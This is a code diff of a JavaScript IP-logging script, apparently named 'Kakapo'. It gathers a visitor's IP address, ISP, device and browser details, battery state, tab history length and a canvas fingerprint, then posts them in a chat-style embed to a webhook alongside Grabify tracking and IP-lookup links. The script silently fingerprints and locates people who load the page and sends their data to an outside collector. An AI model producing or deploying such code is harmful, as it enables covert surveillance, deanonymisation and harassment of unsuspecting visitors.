@@ -329,46 +329,123 @@ let connectionType = getConnection();
 let fingerprint = await createCanvasFingerprint();
 
 
-const message = `
-The Kakapo has found another IP!
-Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>
-Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${ip}>
-<@267417391053537280>
-
-- Graphics Card: ${graphCard}
-- IP: ${ip}
-- ISP: ${isp}
-- OS: ${userOS}
-- User Agent: ${userAgent}
-- Keyboard Language: ${kbLang}
-- Resolution: ${screenResolution}
-- Time Zone: ${userTimeZone}
-- Mobile User: ${isMobile}
-- User Date and Time: ${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})
-- Browser: ${browser}
-- Battery Level: ${batteryLevel} 
-- Battery Charging: ${batteryCharging} 
-- Battery Charge Time: ${batteryChargeTime} 
-- Battery Life Time: ${batteryDishargeTime} 
-- Touch Screen: ${isTouchscreen}
-- Orientation: ${orientation}
-- Logical CPU Cores: ${logicalCores}
-- Internet Connection Type: ${connectionType}
-- RAM (available to browser): ${ram}
-- Tab history length: ${historyInfo}
-- Device Canvas Fingerprint: ${fingerprint}
-`;
-
-const msg = {
-content: message
+const embedMessage = {
+	"content": "<@267417391053537280>\n*BOOM BOOM BOOM BOOM!!*",
+    "embeds": [
+    {
+      "type": "rich",
+      "title": `The Kakapo has found another IP!`,
+      "description": `Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>\n`,
+      "color": 0x22f565,
+      "fields": [
+        {
+          "name": `IP:`,
+          "value": `${ip}`
+        },
+        {
+          "name": `ISP:`,
+          "value": `${isp}`
+        },
+        {
+          "name": `Graphics Card:`,
+          "value": `${graphCard}`
+        },
+        {
+          "name": `OS:`,
+          "value": `${userOS}`
+        },
+        {
+          "name": `User Agent:`,
+          "value": `${userAgent}`
+        },
+        {
+          "name": `Keyboard Language:`,
+          "value": `${kbLang}`
+        },
+        {
+          "name": `Resolution:`,
+          "value": `${screenResolution}`
+        },
+        {
+          "name": `Time Zone:`,
+          "value": `${userTimeZone}`
+        },
+        {
+          "name": `Mobile User:`,
+          "value": `${isMobile}`
+        },
+        {
+          "name": `User Date and Time:`,
+          "value": `${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})`
+        },
+        {
+          "name": `Browser:`,
+          "value": `Browser: ${browser}`
+        },
+        {
+          "name": `Battery Level:`,
+          "value": `${batteryLevel}`
+        },
+        {
+          "name": `Battery Charging:`,
+          "value": `${batteryCharging}`
+        },
+        {
+          "name": `Battery Charge Time:`,
+          "value": `${batteryChargeTime}`
+        },
+        {
+          "name": `Battery Life Time:`,
+          "value": `${batteryDishargeTime}`
+        },
+        {
+          "name": `Touch Screen:`,
+          "value": `${isTouchscreen}`
+        },
+        {
+          "name": `Orientation:`,
+          "value": `${orientation}`
+        },
+        {
+          "name": `Logical CPU Cores:`,
+          "value": `${logicalCores}`
+        },
+        {
+          "name": `Internet Connection Type:`,
+          "value": `${connectionType}`
+        },
+        {
+          "name": `RAM (available to browser):`,
+          "value": `${ram}`
+        },
+        {
+          "name": `Tab history length:`,
+          "value": `${historyInfo}`
+        },
+        {
+          "name": `Device Canvas Fingerprint:`,
+          "value": `${fingerprint}`
+        },
+        {
+          "name": `Check here to see IP VPN and Location status `,
+          "value": `<https://grabify.link/ip-lookup/${ip}>`
+        }
+      ],
+      "thumbnail": {
+        "url": `https://i.ytimg.com/vi/_xPIjmLAi1w/sddefault.jpg`,
+        "height": 0,
+        "width": 0
+      }
+    }
+  ]
 };
 
 await fetch(whurl, {
-method: "POST",
-headers: {
-"content-type": "application/json"
-},
-body: JSON.stringify(msg)
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(embedMessage)
 });
 
 setTimeout(function () {
